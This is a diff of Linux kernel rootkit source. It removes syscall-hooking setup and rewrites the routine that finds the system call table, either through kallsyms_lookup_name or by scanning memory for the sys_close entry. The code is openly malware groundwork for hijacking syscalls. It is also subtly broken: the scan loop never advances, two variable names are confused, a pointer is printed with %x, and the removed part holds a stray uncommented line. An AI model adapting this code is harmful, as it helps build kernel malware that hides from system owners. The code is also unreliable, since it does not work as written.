@@ -1,68 +1,53 @@
 #include "rootkit.h"
 
-static void __exit rootkit__exit(void) {
-   unhook the call 
+void rootkit_exit(void) {
 
-  rootkit__unhook(table, &hook);
 }
 
-static int __init rootkit__init(void) {
-  struct rootkit_hook **cur;
-  int i;
+int rootkit_init(void) {
   int retval;
 
   /* load the parameters */
-
-  hook.call = _hook_call;
-  hook.hook = _hook_hook;
-  hook.unhook_mode = _hook_unhook_mode;
-
-  if (hook.call >= rootkit_TABLE_SIZE)
-    return -EINVAL;
-
   ///* locate the syscall table */
 
-  retval = rootkit__locate_sys_call_table(&table);
-
+  retval = locate_sys_call_table();
   if (retval)
     return retval;
-
-  /* clear the hook table */
-
-  for (cur = rootkit__hook_wrapper_table, i = rootkit_TABLE_SIZE; i; i++)
-    *cur = NULL;
-  return rootkit__hook(table, &hook);
+  printk("We found the sys call table at %x", sys_call_table_addr);
+  return 0;
 }
 
 /**
  * Finds a system call table. This should be done during compile time
- *
+ * if CONFIG_KALLSYMS is defined, we can use kallsyms_lookup_name
+ * otherwise, we have to find the find the table ourselves
+ * 
  * @return 0 if success, EFAULT if failure
  */
-static int rootkit__locate_sys_call_table(rootkit_syscall_handler_t **dest) {
-
+int locate_sys_call_table(void) {
 #ifndef CONFIG_KALLSYMS
-  void *max_ptr;
+  addr_size i = START_ADDRESS;
+  addr_size **sctable; 
 #endif
-  if (dest == NULL)
-    return -EFAULT;
 
 #if CONFIG_KALLSYMS
   /* kernel symbols are accessible */
-
-  *dest = (rootkit_syscall_handler_t *) kallsyms_lookup_name("sys_call_table");
+  printk("CONFIG_KALLSYMS is enabled!");
+  syscall_table_addr = (addr_size *) kallsyms_lookup_name("sys_call_table");
 #else
-  /* iteratively detect for the system call table (it's cache-aligned) */
-
-  max_ptr = (void *) ~0;
-
-  for (*dest = 0; (void *) *dest < max_ptr && **dest != (rootkit_syscall_handler_t) &rootkit_TABLE_FIRST_HANDLER; *dest += SMP_CACHE_BYTES);
-
-  if ((void *) *dest == max_ptr)
-    *dest = NULL;
+  /* iteratively detect for the system call table */
+  printk("CONFIG_KALLSYMS is disabled!");
+  while(i < END_ADDRESS){
+    sctable = (addr_size **) i;
+    if(sctable[__NR_close] == (addr_size *) sys_close){
+      sys_call_table_addr = &sctable[0];
+      break;
+    }
+    syscall_table_addr = 0;
+  }
 #endif
-
-  if (*dest == NULL)
+  /* check for failure*/
+  if (syscall_table_addr == 0)
     return -EFAULT;
   return 0;
 }
